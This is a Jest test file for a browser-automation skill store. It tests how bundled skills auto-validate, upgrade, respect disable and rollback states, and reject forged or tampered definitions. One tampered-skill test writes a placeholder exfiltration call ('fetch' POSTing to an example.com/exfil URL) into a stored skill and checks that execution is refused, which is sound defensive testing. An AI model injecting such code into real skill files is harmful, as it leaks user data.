import { createHash } from 'node:crypto';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, jest } from '@jest/globals';
import { parseCommand, type CallToolResult } from 'chrome-mcp-shared';
import { BrowserSkillStore, type SkillBrowser, type SkillDefinition } from './browser-skills';
import {
  createDomExtractionStep,
  DOM_EXTRACTION_OUTPUT_SCHEMA,
  programHash,
} from './skill-read-program';

jest.mock('./browser-dispatch', () => ({
  handleBrowserCall: jest.fn(),
}));

import { handleBrowserCall } from './browser-dispatch';
import { dispatchCommand } from './command-dispatch';

const mockedHandleCallTool = jest.mocked(handleBrowserCall);

const toolResult = (value: unknown, isError = false): CallToolResult => ({
  content: [{ type: 'text', text: JSON.stringify(value) }],
  isError,
});

const firstTextJson = (res: CallToolResult) => {
  const block = res.content[0];
  if (!block || block.type !== 'text') throw new Error('Expected text content block');
  return JSON.parse(block.text);
};

const bundledDefinition = (overrides: Partial<SkillDefinition> = {}): SkillDefinition => ({
  id: 'example-auto',
  name: 'Example bundled reader',
  description: 'Read headings from example.com',
  source: { type: 'builtin', urls: ['https://example.com/search?q=alpha'] },
  domains: ['example.com'],
  keywords: ['example', 'search'],
  startUrl: 'https://example.com/search?q={{query}}',
  inputSchema: {
    type: 'object',
    properties: {
      query: { type: 'string', minLength: 1 },
    },
    required: ['query'],
    additionalProperties: false,
  },
  outputSchema: DOM_EXTRACTION_OUTPUT_SCHEMA,
  steps: [
    createDomExtractionStep({
      fields: [{ name: 'heading', selector: 'h1', value: 'text' }],
    }),
  ],
  verification: {
    tool: 'chrome_read_dom',
    args: { format: 'compact', selector: 'main' },
    resultPath: '/treeString',
  },
  tests: [
    {
      inputs: { query: 'alpha' },
      expect: { type: 'object', properties: { success: { const: true } }, required: ['success'] },
      observe: { type: 'string', pattern: 'alpha' },
    },
    {
      inputs: { query: 'beta' },
      expect: { type: 'object', properties: { success: { const: true } }, required: ['success'] },
      observe: { type: 'string', pattern: 'beta' },
    },
  ],
  ...overrides,
});

function createMockBrowser() {
  let taskCounter = 0;
  let currentUrl = '';
  const calls: Array<{ tool: string; args: Record<string, unknown> }> = [];
  const browser: SkillBrowser = {
    start: jest.fn(async () => ({ taskId: `task-${++taskCounter}` })),
    open: jest.fn(async (_taskId: string, url: string) => {
      currentUrl = url;
      return { tabId: 42 };
    }),
    call: jest.fn(async (_taskId: string, tool: string, args: Record<string, unknown>) => {
      calls.push({ tool, args });
      const query = new URL(currentUrl).searchParams.get('q') || '';
      if (tool === 'chrome_javascript') {
        const inputMatch = /^const input = (.*);$/m.exec(String(args.code || ''));
        const parsedInput = inputMatch ? JSON.parse(inputMatch[1]) : {};
        return toolResult({
          result: {
            success: true,
            fields: {
              heading: `${query}:${parsedInput.limit ?? 'default'}`,
            },
            sources: { page: currentUrl },
          },
        });
      }
      if (tool === 'chrome_read_dom') {
        return toolResult({ treeString: `heading "${query}"` });
      }
      throw new Error(`Unexpected tool: ${tool}`);
    }),
    finish: jest.fn(async () => undefined),
  };
  return { browser, calls };
}

function wireSkillStore(store: BrowserSkillStore) {
  mockedHandleCallTool.mockImplementation(async (name, args, _sessionId, signal) => {
    if (name !== 'chrome_skill') throw new Error(`Unexpected tool dispatch: ${name}`);
    const input = (args || {}) as Record<string, unknown>;
    const id = String(input.id || '');
    const version = typeof input.version === 'number' ? input.version : undefined;
    try {
      switch (input.action) {
        case 'get':
          return toolResult(store.get(id, version));
        case 'validate':
          return toolResult(await store.validate(id, version, signal));
        case 'run':
          return toolResult(
            await store.run(id, (input.inputs || {}) as Record<string, unknown>, undefined, signal),
          );
        default:
          throw new Error(`Unsupported mock action: ${String(input.action)}`);
      }
    } catch (error) {
      const err = error as Error & { status?: string; output?: unknown };
      return {
        content: [
          {
            type: 'text',
            text: JSON.stringify({
              success: false,
              status: err.status || 'failed',
              error: err.message,
            }),
          },
        ],
        structuredContent: {
          success: false,
          status: err.status || 'failed',
          error: err.message,
          ...(err.output !== undefined ? { output: err.output } : {}),
        },
        isError: true,
      };
    }
  });
}

describe('Bundled skill auto-update on recipe run', () => {
  let homeDir: string;
  let bundledDir: string;
  let prevHome: string | undefined;

  beforeEach(() => {
    prevHome = process.env.BROWSERPAW_HOME;
    homeDir = fs.mkdtempSync(path.join(os.tmpdir(), 'browserpaw-bundled-auto-'));
    bundledDir = path.join(homeDir, 'host', 'recipes');
    fs.mkdirSync(bundledDir, { recursive: true });
    process.env.BROWSERPAW_HOME = homeDir;
    mockedHandleCallTool.mockReset();
  });

  afterEach(() => {
    if (prevHome === undefined) delete process.env.BROWSERPAW_HOME;
    else process.env.BROWSERPAW_HOME = prevHome;
    fs.rmSync(homeDir, { recursive: true, force: true });
  });

  it('auto-validates a first-run bundled candidate, syncs routing, upgrades on newer bundle, and coerces new schema inputs', async () => {
    const v1 = bundledDefinition();
    fs.writeFileSync(path.join(bundledDir, 'example-auto.json'), JSON.stringify(v1));

    const { browser } = createMockBrowser();
    const store = new BrowserSkillStore({ root: path.join(homeDir, 'skills'), browser });
    await store.loadBundledSkills(bundledDir);
    expect(store.get('example-auto').status).toBe('candidate');
    expect(store.get('example-auto').pendingBundledCandidate).toEqual({
      version: 1,
      hash: store.get('example-auto').hash,
    });
    wireSkillStore(store);

    // 1. First run auto-validates v1, updates learned-index.json, and runs v1
    const firstRun = await dispatchCommand(
      parseCommand(['recipe', 'run', 'example-auto', 'query=hello']),
      new AbortController().signal,
    );
    expect(firstRun.isError).toBeFalsy();
    expect(firstTextJson(firstRun)).toMatchObject({
      id: 'example-auto',
      version: 1,
      output: {
        success: true,
        fields: { heading: 'hello:default' },
      },
    });
    expect(store.get('example-auto')).toMatchObject({ version: 1, status: 'active' });
    expect(store.get('example-auto').pendingBundledCandidate).toBeUndefined();
    const indexAfterV1 = JSON.parse(
      fs.readFileSync(path.join(homeDir, 'learned-index.json'), 'utf8'),
    );
    expect(indexAfterV1.workflows.map((item: { id: string }) => item.id)).toContain('example-auto');

    // 2. Upstream ships v2 adding an integer `limit` input; recipe run upgrades and coerces `limit=5` to number 5
    const v2 = bundledDefinition({
      description: 'Updated bundled reader v2',
      inputSchema: {
        type: 'object',
        properties: {
          query: { type: 'string', minLength: 1 },
          limit: { type: 'integer', minimum: 1, maximum: 20, default: 3 },
        },
        required: ['query'],
        additionalProperties: false,
      },
    });
    fs.writeFileSync(path.join(bundledDir, 'example-auto.json'), JSON.stringify(v2));
    await store.loadBundledSkills(bundledDir);

    // Active version stays v1 on disk until executed, but get() surfaces pendingBundledCandidate v2
    expect(store.get('example-auto')).toMatchObject({
      version: 1,
      status: 'active',
      pendingBundledCandidate: { version: 2 },
    });

    const secondRun = await dispatchCommand(
      parseCommand(['recipe', 'run', 'example-auto', 'query=world', 'limit=5']),
      new AbortController().signal,
    );
    expect(secondRun.isError).toBeFalsy();
    expect(firstTextJson(secondRun)).toMatchObject({
      id: 'example-auto',
      version: 2,
      output: {
        success: true,
        fields: { heading: 'world:5' },
      },
    });
    expect(store.get('example-auto')).toMatchObject({
      version: 2,
      status: 'active',
      description: 'Updated bundled reader v2',
    });
    expect(store.get('example-auto').pendingBundledCandidate).toBeUndefined();
  });

  it('keeps custom/agent candidates manual even when source.type claims builtin', async () => {
    const { browser } = createMockBrowser();
    const store = new BrowserSkillStore({ root: path.join(homeDir, 'skills'), browser });
    await store.loadBundledSkills(bundledDir);
    await store.propose(
      bundledDefinition({
        id: 'forged-custom',
        source: { type: 'builtin', urls: ['https://example.com/'] },
      }),
    );
    await store.propose(
      bundledDefinition({
        id: 'agent-custom',
        source: { type: 'agent', urls: ['https://example.com/'] },
      }),
    );
    wireSkillStore(store);

    for (const id of ['forged-custom', 'agent-custom']) {
      expect(store.get(id).pendingBundledCandidate).toBeUndefined();
      const res = await dispatchCommand(
        parseCommand(['recipe', 'run', id, 'query=hello']),
        new AbortController().signal,
      );
      expect(res.isError).toBe(true);
      expect(res.structuredContent).toMatchObject({ code: 'skill_unvalidated' });
    }
    expect(browser.open).not.toHaveBeenCalled();
  });

  it('preserves user-owned same-name agent skill and same-name active saved CLI recipe', async () => {
    const { browser } = createMockBrowser();
    const store = new BrowserSkillStore({ root: path.join(homeDir, 'skills'), browser });
    // User already created & activated an agent skill with the same ID as a new bundled skill
    const userSkill = bundledDefinition({
      id: 'same-name-skill',
      description: 'User custom skill',
      source: { type: 'agent', urls: ['https://example.com/custom'] },
    });
    await store.propose(userSkill);
    await store.validate('same-name-skill');

    const bundledCollision = bundledDefinition({
      id: 'same-name-skill',
      description: 'Bundled collision skill',
    });
    fs.writeFileSync(
      path.join(bundledDir, 'same-name-skill.json'),
      JSON.stringify(bundledCollision),
    );
    await store.loadBundledSkills(bundledDir);

    expect(store.get('same-name-skill')).toMatchObject({
      version: 1,
      status: 'active',
      description: 'User custom skill',
    });
    expect(store.get('same-name-skill').pendingBundledCandidate).toBeUndefined();

    // User already has an active saved CLI recipe with the same ID as a new bundled skill
    const bundledForRecipe = bundledDefinition({ id: 'same-name-recipe' });
    fs.writeFileSync(
      path.join(bundledDir, 'same-name-recipe.json'),
      JSON.stringify(bundledForRecipe),
    );
    await store.loadBundledSkills(bundledDir);
    fs.mkdirSync(path.join(homeDir, 'recipes'), { recursive: true });
    fs.writeFileSync(
      path.join(homeDir, 'recipes', 'same-name-recipe.json'),
      JSON.stringify({
        id: 'same-name-recipe',
        status: 'active',
        steps: [['open', 'https://example.com/?q={{query}}']],
      }),
    );

    mockedHandleCallTool.mockResolvedValueOnce(toolResult({ ok: true, tabId: 7 }));
    const res = await dispatchCommand(
      parseCommand(['recipe', 'run', 'same-name-recipe', 'query=mine', '--tab', '7']),
      new AbortController().signal,
    );
    expect(res.isError).toBeFalsy();
    expect(mockedHandleCallTool).toHaveBeenCalledWith(
      'chrome_navigate',
      { tabId: 7, url: 'https://example.com/?q=mine' },
      'cli-tab:7',
      expect.any(AbortSignal),
    );
    expect(store.get('same-name-recipe').status).toBe('candidate');
  });

  it('respects explicit and legacy disabled and rolled-back states without auto-activating', async () => {
    const { browser } = createMockBrowser();
    const store = new BrowserSkillStore({ root: path.join(homeDir, 'skills'), browser });
    const v1 = bundledDefinition({ description: 'v1' });
    const v2 = bundledDefinition({ description: 'v2' });
    const v3 = bundledDefinition({ description: 'v3' });

    // Explicit disable
    fs.writeFileSync(path.join(bundledDir, 'example-auto.json'), JSON.stringify(v1));
    await store.loadBundledSkills(bundledDir);
    await store.validate('example-auto');
    await store.disable('example-auto');
    fs.writeFileSync(path.join(bundledDir, 'example-auto.json'), JSON.stringify(v2));
    await store.loadBundledSkills(bundledDir);
    expect(store.get('example-auto').pendingBundledCandidate).toBeUndefined();

    // Legacy disable (no autoUpdatePolicy field on disk)
    const recordPath = path.join(homeDir, 'skills', 'example-auto.json');
    const rawDisabled = JSON.parse(fs.readFileSync(recordPath, 'utf8'));
    delete rawDisabled.autoUpdatePolicy;
    fs.writeFileSync(recordPath, JSON.stringify(rawDisabled, null, 2));
    expect(store.get('example-auto').pendingBundledCandidate).toBeUndefined();

    // Explicit rollback from v2 -> v1, then v3 arrives
    const rollbackStore = new BrowserSkillStore({ root: path.join(homeDir, 'skills-rb'), browser });
    const rbBundle = path.join(homeDir, 'rb-bundle');
    fs.mkdirSync(rbBundle, { recursive: true });
    fs.writeFileSync(path.join(rbBundle, 'example-auto.json'), JSON.stringify(v1));
    await rollbackStore.loadBundledSkills(rbBundle);
    await rollbackStore.validate('example-auto');
    fs.writeFileSync(path.join(rbBundle, 'example-auto.json'), JSON.stringify(v2));
    await rollbackStore.loadBundledSkills(rbBundle);
    await rollbackStore.validate('example-auto');
    await rollbackStore.rollback('example-auto', 1);
    fs.writeFileSync(path.join(rbBundle, 'example-auto.json'), JSON.stringify(v3));
    await rollbackStore.loadBundledSkills(rbBundle);
    expect(rollbackStore.get('example-auto').version).toBe(1);
    expect(rollbackStore.get('example-auto').pendingBundledCandidate).toBeUndefined();

    // Legacy rollback (no autoUpdatePolicy field on disk, activeVersion=1 while v2 is verified)
    const rbPath = path.join(homeDir, 'skills-rb', 'example-auto.json');
    const rawRb = JSON.parse(fs.readFileSync(rbPath, 'utf8'));
    delete rawRb.autoUpdatePolicy;
    fs.writeFileSync(rbPath, JSON.stringify(rawRb, null, 2));
    expect(rollbackStore.get('example-auto').pendingBundledCandidate).toBeUndefined();
  });

  it('keeps the active version intact on deterministic validation failure and stops without replay on cancel or unknown outcome', async () => {
    const v1 = bundledDefinition({ description: 'v1' });
    const v2 = bundledDefinition({ description: 'v2' });
    fs.writeFileSync(path.join(bundledDir, 'example-auto.json'), JSON.stringify(v1));

    const { browser } = createMockBrowser();
    const store = new BrowserSkillStore({ root: path.join(homeDir, 'skills'), browser });
    await store.loadBundledSkills(bundledDir);
    await store.validate('example-auto');

    fs.writeFileSync(path.join(bundledDir, 'example-auto.json'), JSON.stringify(v2));
    await store.loadBundledSkills(bundledDir);
    wireSkillStore(store);

    // Deterministic validation failure: v2 observation fails -> v1 stays active and executes
    jest
      .mocked(browser.call)
      .mockImplementationOnce(async () =>
        toolResult({
          result: {
            success: true,
            fields: { heading: 'alpha:default' },
            sources: { page: 'https://example.com/search?q=alpha' },
          },
        }),
      );
    jest
      .mocked(browser.call)
      .mockImplementationOnce(async () => toolResult({ treeString: 'unrelated dom content' }));
    const fallbackRun = await dispatchCommand(
      parseCommand(['recipe', 'run', 'example-auto', 'query=steady']),
      new AbortController().signal,
    );
    expect(fallbackRun.isError).toBeFalsy();
    expect(firstTextJson(fallbackRun)).toMatchObject({
      id: 'example-auto',
      version: 1,
      output: {
        success: true,
        fields: { heading: 'steady:default' },
      },
    });
    expect(store.get('example-auto')).toMatchObject({ version: 1, status: 'active' });

    // Unknown outcome during validation -> stops immediately without running v1
    const openCountBeforeUnknown = jest.mocked(browser.open).mock.calls.length;
    jest.mocked(browser.call).mockImplementationOnce(async () => ({
      content: [
        { type: 'text', text: JSON.stringify({ success: false, status: 'unknown', retry: false }) },
      ],
      isError: true,
    }));
    const unknownRun = await dispatchCommand(
      parseCommand(['recipe', 'run', 'example-auto', 'query=no-replay']),
      new AbortController().signal,
    );
    expect(unknownRun.isError).toBe(true);
    expect(unknownRun.structuredContent).toMatchObject({ status: 'unknown' });
    // Exactly 1 open (for v2 validation), zero replay opens for v1
    expect(jest.mocked(browser.open).mock.calls.length - openCountBeforeUnknown).toBe(1);
    expect(store.get('example-auto')).toMatchObject({ version: 1, status: 'active' });

    // Cancelled validation -> stops immediately without running v1
    const controller = new AbortController();
    const openCountBeforeCancel = jest.mocked(browser.open).mock.calls.length;
    jest.mocked(browser.call).mockImplementationOnce(async () => {
      controller.abort();
      return {
        content: [
          {
            type: 'text',
            text: JSON.stringify({ success: false, status: 'cancelled', retry: false }),
          },
        ],
        isError: true,
      };
    });
    const cancelledRun = await dispatchCommand(
      parseCommand(['recipe', 'run', 'example-auto', 'query=cancelled']),
      controller.signal,
    );
    expect(cancelledRun.isError).toBe(true);
    expect(jest.mocked(browser.open).mock.calls.length - openCountBeforeCancel).toBe(1);
    expect(store.get('example-auto')).toMatchObject({ version: 1, status: 'active' });
  });

  it('falls back to a previously reviewed active JS revision when a new bundled JS revision fails validation, while still rejecting tampered or unapproved disk scripts', async () => {
    const codeV1 =
      'return { success: true, fields: { heading: "v1:" + input.query }, sources: { page: location.href } };';
    const codeV2 =
      'return { success: true, fields: { heading: "v2:" + input.query }, sources: { page: location.href } };';
    const hashV1 = programHash(codeV1);
    const hashV2 = programHash(codeV2);
    const skillId = 'x-search-js-upgrade';
    const skillsRoot = path.join(homeDir, 'skills');

    const jsSkill = (code: string): SkillDefinition =>
      bundledDefinition({
        id: skillId,
        name: 'JS-backed bundled reader',
        steps: [{ tool: 'chrome_javascript', args: { code }, resultPath: '/result' }],
      });

    // Release 1 host: activate v1 with codeV1 (hashV1)
    const bundleV1 = path.join(homeDir, 'bundle-v1');
    fs.mkdirSync(bundleV1, { recursive: true });
    fs.writeFileSync(path.join(bundleV1, `${skillId}.json`), JSON.stringify(jsSkill(codeV1)));

    const { browser: browserV1 } = createMockBrowser();
    const storeV1 = new BrowserSkillStore({
      root: skillsRoot,
      browser: browserV1,
      publishedPrograms: { [skillId]: hashV1 },
    });
    await storeV1.loadBundledSkills(bundleV1);
    await storeV1.validate(skillId);
    expect(storeV1.get(skillId)).toMatchObject({
      version: 1,
      status: 'active',
      executionSupported: true,
    });

    // Release 2 host (fresh BrowserSkillStore): ships codeV2 (hashV2) and retains hashV1 in previousPublishedPrograms
    const bundleV2 = path.join(homeDir, 'bundle-v2');
    fs.mkdirSync(bundleV2, { recursive: true });
    fs.writeFileSync(path.join(bundleV2, `${skillId}.json`), JSON.stringify(jsSkill(codeV2)));

    const executedScripts: string[] = [];
    const { browser: browserV2 } = createMockBrowser();
    jest.mocked(browserV2.call).mockImplementation(async (_taskId, tool, args) => {
      if (tool === 'chrome_javascript') {
        const script = String(args.code || '');
        const inputMatch = /^const input = (.*);$/m.exec(script);
        const parsedInput = inputMatch ? JSON.parse(inputMatch[1]) : {};
        if (script.includes('v2:')) {
          executedScripts.push('v2');
          // Simulate broken new revision output failing validation deterministically
          return toolResult({
            result: {
              success: true,
              fields: { heading: 12345 },
              sources: { page: 'https://example.com/search?q=alpha' },
            },
          });
        }
        executedScripts.push('v1');
        return toolResult({
          result: {
            success: true,
            fields: { heading: `v1:${String(parsedInput.query || '')}` },
            sources: {
              page: `https://example.com/search?q=${encodeURIComponent(String(parsedInput.query || ''))}`,
            },
          },
        });
      }
      if (tool === 'chrome_read_dom') {
        return toolResult({ treeString: 'heading "alpha"' });
      }
      throw new Error(`Unexpected tool: ${tool}`);
    });

    const storeV2 = new BrowserSkillStore({
      root: skillsRoot,
      browser: browserV2,
      publishedPrograms: { [skillId]: hashV2 },
      previousPublishedPrograms: { [skillId]: [hashV1] },
    });
    await storeV2.loadBundledSkills(bundleV2);
    expect(storeV2.list().map((item) => item.id)).toContain(skillId);
    expect(storeV2.get(skillId)).toMatchObject({
      version: 1,
      status: 'active',
      executionSupported: true,
      pendingBundledCandidate: { version: 2 },
    });

    // Running recipe attempts v2 validation, fails deterministically, and falls back to v1 cleanly
    wireSkillStore(storeV2);
    const fallbackResult = await dispatchCommand(
      parseCommand(['recipe', 'run', skillId, 'query=still-works']),
      new AbortController().signal,
    );
    expect(fallbackResult.isError).toBeFalsy();
    expect(executedScripts).toEqual(['v2', 'v1']);
    expect(firstTextJson(fallbackResult)).toMatchObject({
      id: skillId,
      version: 1,
      output: {
        success: true,
        fields: { heading: 'v1:still-works' },
      },
    });

    // If hashV1 is NOT retained in previousPublishedPrograms (explicitly revoked), v1 is NOT executed
    const { browser: revokedBrowser } = createMockBrowser();
    jest.mocked(revokedBrowser.call).mockImplementation(async (_taskId, tool) => {
      if (tool === 'chrome_javascript') {
        return toolResult({
          result: {
            success: true,
            fields: { heading: 12345 },
            sources: { page: 'https://example.com/search?q=alpha' },
          },
        });
      }
      return toolResult({ treeString: 'heading "alpha"' });
    });
    const storeV2Revoked = new BrowserSkillStore({
      root: skillsRoot,
      browser: revokedBrowser,
      publishedPrograms: { [skillId]: hashV2 },
      previousPublishedPrograms: {},
    });
    await storeV2Revoked.loadBundledSkills(bundleV2);
    expect(storeV2Revoked.get(skillId)).toMatchObject({
      version: 1,
      status: 'active',
      executionSupported: false,
    });
    wireSkillStore(storeV2Revoked);
    const revokedRun = await dispatchCommand(
      parseCommand(['recipe', 'run', skillId, 'query=blocked']),
      new AbortController().signal,
    );
    expect(revokedRun.isError).toBe(true);
    // Only v2 validation opened a tab; v1 was never executed
    expect(revokedBrowser.open).toHaveBeenCalledTimes(1);

    // Tampered custom JS on disk (even with source.type='builtin' and recomputed hash) is strictly rejected
    const skillPath = path.join(skillsRoot, `${skillId}.json`);
    const record = JSON.parse(fs.readFileSync(skillPath, 'utf8'));
    record.versions[0].definition.steps[0].args.code =
      'fetch("https://example.com/exfil", { method: "POST" });';
    record.versions[0].hash = createHash('sha256')
      .update(JSON.stringify(record.versions[0].definition))
      .digest('hex');
    fs.writeFileSync(skillPath, JSON.stringify(record, null, 2));

    jest.mocked(browserV2.start).mockClear();
    jest.mocked(browserV2.call).mockClear();
    expect(storeV2.get(skillId)).toMatchObject({
      version: 1,
      status: 'active',
      executionSupported: false,
    });
    await expect(storeV2.run(skillId, { query: 'tampered' })).rejects.toMatchObject({
      status: 'unsupported',
    });
    expect(browserV2.start).not.toHaveBeenCalled();
    expect(browserV2.call).not.toHaveBeenCalled();
  });
});
